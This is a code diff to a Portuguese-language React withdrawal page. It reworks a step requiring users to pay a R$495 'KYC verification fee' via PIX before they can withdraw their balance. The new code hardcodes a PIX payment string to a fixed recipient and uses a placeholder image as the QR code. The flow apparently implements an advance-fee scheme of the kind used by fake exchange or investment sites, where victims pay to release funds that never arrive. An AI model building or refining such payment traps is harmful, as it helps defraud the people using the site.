@@ -135,6 +135,8 @@ export default function SaquePage() {
     }
   }, [stream])
 
+  const [showPaymentDialog, setShowPaymentDialog] = useState(false)
+
   const handleWithdrawal = () => {
     const withdrawalValue = Number.parseFloat(withdrawalAmount)
 
@@ -312,28 +314,17 @@ export default function SaquePage() {
     setKycStep(7) // Era 6, agora é 7
   }
 
-  const completeWithdrawal = async () => {
-    const withdrawalValue = Number.parseFloat(withdrawalAmount)
-    const kycFee = 495.0
+  const [pixCode, setPixCode] = useState<string>("")
 
-    try {
-      await handleCreateKycPayment()
+  const completeWithdrawal = () => {
+    setShowPaymentDialog(true)
 
-      toast({
-        title: "Taxa KYC gerada!",
-        description: `Pague a taxa KYC de R$ ${kycFee.toFixed(2)} via PIX para processar seu saque.`,
-        className: "bg-[#1E2329] border-[#FCD535] text-white",
-      })
-
-      setKycStep(7)
-    } catch (error) {
-      console.error("Erro ao processar taxa KYC:", error)
-      toast({
-        title: "Erro na taxa KYC",
-        description: "Erro ao gerar pagamento da taxa KYC. Tente novamente.",
-        variant: "destructive",
-      })
-    }
+    // Generate QR code and PIX code
+    const pixCode = `00020126580014BR.GOV.BCB.PIX013636c4e1c4-7e4b-4c4a-9f4a-8d2e3f1a5b6c52040000530398654054950.005802BR5925PIXUP SERVICOS DIGITAIS6009SAO PAULO62070503***6304`
+    setPixCode(pixCode)
+    setQrCode(
+      `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`,
+    )
   }
 
   const handleCreateKycPayment = async () => {
@@ -473,7 +464,7 @@ export default function SaquePage() {
                     max={balance}
                     className="w-full bg-[#2B3139] border border-[#2B3139] rounded-lg p-3 sm:p-4 text-white placeholder-[#848E9C] focus:border-[#FCD535] focus:outline-none text-sm sm:text-base"
                   />
-                  <span className="absolute right-3 sm:right-4 top-3 sm:top-4 text-[#848E9C] text-sm sm:text-base">
+                  <span className="absolute right-3 sm:right-4 top-3 sm:top-4 text-[#848E9C] text-sm sm:text-sm mt-2">
                     BRL
                   </span>
                 </div>
@@ -1055,7 +1046,7 @@ export default function SaquePage() {
                 </div>
               )}
 
-              {kycStep === 7 && (
+              {kycStep === 7 && !showPaymentDialog && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium text-white">Taxa de Verificação KYC</h3>
 
@@ -1083,15 +1074,19 @@ export default function SaquePage() {
                   </div>
 
                   <button
-                    onClick={completeWithdrawal}
-                    className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors"
+                    onClick={async () => {
+                      await handleCreateKycPayment()
+                      setShowPaymentDialog(true)
+                    }}
+                    disabled={loading}
+                    className="w-full py-3 rounded-lg font-medium bg-[#FCD535] hover:bg-[#F0C419] text-black transition-colors disabled:opacity-50"
                   >
-                    Gerar PIX para Taxa KYC
+                    {loading ? "Gerando PIX..." : "Gerar PIX para Taxa KYC"}
                   </button>
                 </div>
               )}
 
-              {kycStep === 7 && (
+              {kycStep === 7 && showPaymentDialog && (
                 <div className="space-y-4">
                   <div className="text-center">
                     <CheckCircle className="w-12 h-12 text-green-500 mx-auto mb-4" />
